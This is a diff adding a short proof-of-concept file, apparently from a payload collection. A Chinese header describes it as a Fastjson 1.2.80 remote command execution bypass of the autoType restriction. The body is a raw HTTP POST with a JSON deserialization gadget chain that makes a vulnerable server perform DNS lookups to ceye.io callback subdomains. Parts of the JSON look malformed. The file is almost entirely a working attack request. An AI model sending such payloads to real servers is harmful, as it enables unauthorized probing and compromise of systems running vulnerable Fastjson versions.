@@ -1,0 +1,11 @@
+# Fastjson_1.2.80远程命令执行漏洞
+# fastjson已使用黑白名单用于防御反序列化漏洞，经研究该利用在特定条件下可绕过默认autoType关闭限制，攻击远程服务器。
+POST /?acid=80025456&bid=hd_tag_m8mv2616 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2616
+RM-PRO-Token: 5d45a86f8dcc2f09962bac27d3baee9c
+RM-PRO-Time: 1742808523982
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{"a":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"1.zj96tn.ceye.io"}}},"b":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"2.zj96tn.ceye.io"}}}}
